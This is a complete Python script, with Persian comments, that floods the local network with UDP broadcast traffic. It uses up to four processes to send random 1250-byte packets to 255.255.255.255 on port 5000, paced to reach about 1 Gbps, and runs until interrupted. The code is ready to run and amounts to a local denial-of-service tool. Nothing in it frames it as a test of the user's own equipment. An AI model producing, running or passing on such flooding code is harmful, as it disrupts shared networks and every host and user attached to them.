import socket
import multiprocessing
import os
import time

# تنظیمات
TARGET_BANDWIDTH_BPS = 1_000_000_000  # 1 Gbps
PACKET_SIZE = 1250  # بایت
CPU_CORES = os.cpu_count() or 4
PROCESS_COUNT = min(CPU_CORES, 4)  # محدود به ۴ هسته
PACKETS_PER_SECOND = TARGET_BANDWIDTH_BPS // 8 // PACKET_SIZE
PACKETS_PER_PROCESS = PACKETS_PER_SECOND // PROCESS_COUNT
PORT = 5000

def flood_worker(port, packet_size, pps, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    message = os.urandom(packet_size)
    interval_ns = int(1e9 / pps)

    next_send = time.time_ns()
    while not stop_event.is_set():
        now = time.time_ns()
        if now >= next_send:
            sock.sendto(message, ('255.255.255.255', port))
            next_send += interval_ns
        else:
            time.sleep((next_send - now) / 1e9)

def start_flood():
    stop_event = multiprocessing.Event()
    processes = []

    print(f"🚀 Starting broadcast flood at ~1 Gbps using {PROCESS_COUNT} processes...")
    try:
        for _ in range(PROCESS_COUNT):
            p = multiprocessing.Process(
                target=flood_worker,
                args=(PORT, PACKET_SIZE, PACKETS_PER_PROCESS, stop_event)
            )
            p.start()
            processes.append(p)

        print("🔴 Press Ctrl+C to stop.")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("🛑 Stopping flood...")
        stop_event.set()
        for p in processes:
            p.join()
        print("✅ Flood stopped.")

if __name__ == "__main__":
    start_flood()
